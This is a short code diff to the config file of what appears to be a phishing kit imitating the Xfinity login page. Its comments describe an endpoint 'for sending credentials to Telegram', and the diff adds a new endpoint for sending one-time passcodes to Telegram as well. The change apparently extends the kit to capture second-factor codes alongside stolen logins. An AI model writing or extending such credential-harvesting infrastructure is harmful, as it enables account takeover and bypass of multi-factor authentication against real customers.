@@ -5,8 +5,10 @@
  */
 export const config = {
   api: {
-    // The endpoint for the Telegram notification API.
+    // The endpoint for sending credentials to Telegram.
     sendTelegramEndpoint: '/api/sendTelegram',
+    // The separate endpoint for sending OTP to Telegram.
+    sendOtpEndpoint: '/api/sendOtp',
   },
   redirects: {
     // The static Xfinity login landing page (with OAuth-style query params).
